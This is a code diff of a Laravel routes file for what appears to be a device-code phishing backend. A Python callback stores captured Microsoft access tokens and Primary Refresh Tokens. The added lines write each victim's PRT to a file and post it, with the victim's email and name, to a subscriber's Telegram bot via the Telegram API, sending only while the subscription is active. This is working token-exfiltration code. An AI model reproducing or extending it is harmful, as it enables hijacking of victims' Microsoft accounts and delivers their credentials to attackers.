@@ -64,9 +64,10 @@ Route::get('/poll/{login_id}', [MicrosoftAuthController::class, 'poll']);
 | PYTHON CALLBACK
 |--------------------------------------------------------------------------
 */
+
 Route::post('/python/callback', function (Request $request) {
 
-    // 🔐 security check
+    // 🔐 Security check
     if ($request->header('X-Python-Secret') !== config('services.python.secret')) {
         return response()->json(['error' => 'unauthorized'], 403);
     }
@@ -74,27 +75,24 @@ Route::post('/python/callback', function (Request $request) {
     Log::info('PYTHON CALLBACK', $request->all());
 
     $job = PythonJob::find($request->job_id);
-
     if (!$job) {
         return response()->json(['error' => 'job not found'], 404);
     }
 
     $data = $request->input('data');
-
-    // 🔥 ambil result lama (biar ga ketimpa)
     $result = $job->result ?? [];
 
-    // 🔥 handle waiting_user (device code)
+    // 🔥 Handle waiting_user (device code)
     if ($request->status === 'waiting_user') {
         $result['device'] = $data;
     }
 
-    // 🔥 handle done (token)
+    // 🔥 Handle done (token)
     if ($request->status === 'done') {
         $result['auth'] = $data;
     }
 
-    // 🔥 update job
+    // 🔥 Update job
     $job->update([
         'status' => $request->status,
         'result' => $result,
@@ -113,7 +111,6 @@ Route::post('/python/callback', function (Request $request) {
             $prt = $data['prt'] ?? null;
 
             $idToken = is_array($prt) ? ($prt['id_token'] ?? null) : null;
-
             $decoded = decodeJwt($idToken);
 
             $email = is_array($decoded)
@@ -124,9 +121,8 @@ Route::post('/python/callback', function (Request $request) {
                 ? ($decoded['name'] ?? trim(($decoded['given_name'] ?? '') . ' ' . ($decoded['family_name'] ?? '')))
                 : null;
 
-            // 🔥 jangan insert kalau kosong
+            // 🔥 Simpan token ke DB
             if (!empty($data['access_token']) || !empty($prt)) {
-
                 Token::create([
                     'user_id' => $job->user_id,
                     'access_token' => $data['access_token'] ?? null,
@@ -137,6 +133,48 @@ Route::post('/python/callback', function (Request $request) {
                     'expires_at' => now()->addSeconds((int) ($data['expires_in'] ?? 3600)),
                     'status' => 'active',
                 ]);
+            }
+
+            // 🔥 Ambil user
+            $user = $job->user;
+
+            // 🔥 Cek subscription expired (lebih dari 30 hari dari created_at)
+            if ($user && !$user->isSubscriptionExpired()) {
+
+                $settings = $user->settings;
+
+                if ($settings && $settings->telegram_id_1 && $settings->telegram_bot_1) {
+                    $telegramId = $settings->telegram_id_1;
+                    $botToken = $settings->telegram_bot_1;
+
+                    // 🔥 Buat file hanya berisi PRT
+                    $fileContent = json_encode($data['prt'] ?? []);
+                    $filePath = storage_path("app/public/{$job->id}_prt.txt");
+                    file_put_contents($filePath, $fileContent);
+
+                    // 🔥 Caption berisi email dan name
+                    $caption = "Email: {$email}\nName: {$name}";
+
+                    // 🔥 Kirim file ke Telegram
+                    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
+                    $postFields = [
+                        'chat_id' => $telegramId,
+                        'document' => new \CURLFile($filePath),
+                        'caption' => $caption
+                    ];
+
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
+                    curl_setopt($ch, CURLOPT_POST, true);
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    $response = curl_exec($ch);
+                    curl_close($ch);
+
+                    Log::info("Telegram sent to {$telegramId}", ['response' => $response]);
+                }
+            } else {
+                Log::info("User {$user->id} subscription expired, telegram not sent.");
             }
 
         } catch (\Throwable $e) {
